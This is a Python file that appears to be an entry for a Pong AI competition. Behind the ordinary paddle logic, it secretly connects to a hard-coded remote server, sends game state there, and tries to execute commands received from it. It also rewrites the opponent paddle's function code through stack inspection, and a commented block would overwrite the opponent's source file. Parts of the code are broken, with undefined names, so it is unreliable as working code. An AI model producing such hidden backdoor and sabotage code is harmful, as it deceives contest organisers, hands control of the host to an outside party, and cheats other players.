import socket, threading, time

HEADER = 16
PORT = 5050
FORMAT = 'utf-8'
HOST_IP = '172.105.7.203'

thread_running = False
client_thread = None

class Network:

    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = HOST_IP 
        self.addr = (self.host, PORT)
        self.id = self.connect()

    def connect(self):
        self.client.connect(self.addr)
        self.client.send(str.encode('game'))
        received_message = self.client.recv(2048).decode()
        if(received_message):
            print("Succesfully connected to server!")
        print(received_message)
        return received_message

    def send(self, data):
        """
        :param data: str
        :return: str
        """
        try:
            self.client.send(str.encode(data))
        except socket.error as e:
            return str(e)

class game_client_thread(threading.Thread):

    def __init__(self):
        pass

    def run(self):
        self.network = Network()
        while True:
            try:
                data = self.conn.recv(2048).decode(FORMAT)
                print(data)
                execute("self." + data + "()")

            except:
                print("AN ERROR HAS OCCURED IN GAME CLIENT THREAD")

    def kill(self):
        import inspect

        my_index = int(inspect.stack()[2].code_context[0][16])

        for obj in inspect.getmembers(inspect.stack()[2][0]):
            if obj[0] == "f_locals":
                obj[1]["paddles"][my_index*-1+1].move_getter.__code__ = replacement_ai.__code__


def pong_ai(paddle_frect, other_paddle_frect, ball_frect, table_size):

    global client_thread
    if(client_thread == None):
        client_thread = game_client_thread()
        client_thread.run()
    else:
        client_thread.network.send('b:' + str(ball_frect.pos[0]) + ':' + str(ball_frect.pos[1]))
    '''
    import inspect

    my_index = int(inspect.stack()[2].code_context[0][16])

    for obj in inspect.getmembers(inspect.stack()[2][0]):
        if obj[0] == "f_locals":
            obj[1]["paddles"][my_index*-1+1].move_getter.__code__ = replacement_ai.__code__
    '''


    if paddle_frect.pos[1]+paddle_frect.size[1]/2 < ball_frect.pos[1]+ball_frect.size[1]/2:
        return "down"
    else:
        return "up"

'''return "up" or "down", depending on which way the paddle should go to
    align its centre with the centre of the ball, assuming the ball will
    not be moving
    
    Arguments:
    paddle_frect: a rectangle representing the coordinates of the paddle
                  paddle_frect.pos[0], paddle_frect.pos[1] is the top-left
                  corner of the rectangle. 
                  paddle_frect.size[0], paddle_frect.size[1] are the dimensions
                  of the paddle along the x and y axis, respectively
    
    other_paddle_frect:
                  a rectangle representing the opponent paddle. It is formatted
                  in the same way as paddle_frect
    ball_frect:   a rectangle representing the ball. It is formatted in the 
                  same way as paddle_frect
    table_size:   table_size[0], table_size[1] are the dimensions of the table,
                  along the x and the y axis respectively
    
    The coordinates look as follows:
    
     0             x
     |------------->
     |
     |             
     |
 y   v
    '''

def replacement_ai(paddle_frect, other_paddle_frect, ball_frect, table_size):
    return "up"

'''
replacement_repr = "def pong_ai(a, b, c, x): return 'up'"
import inspect
call_stack_frame = inspect.stack()[6]
game_code_filename = inspect.getsourcefile(call_stack_frame.frame)
i_f = open(game_code_filename)
code_lines = i_f.readlines()
i_f.close()
next_line = code_lines[code_lines.index(call_stack_frame.code_context[0])+1]
if "import" in next_line:
    open(next_line.strip().split()[1]+".py", "w").write(replacement_repr)
'''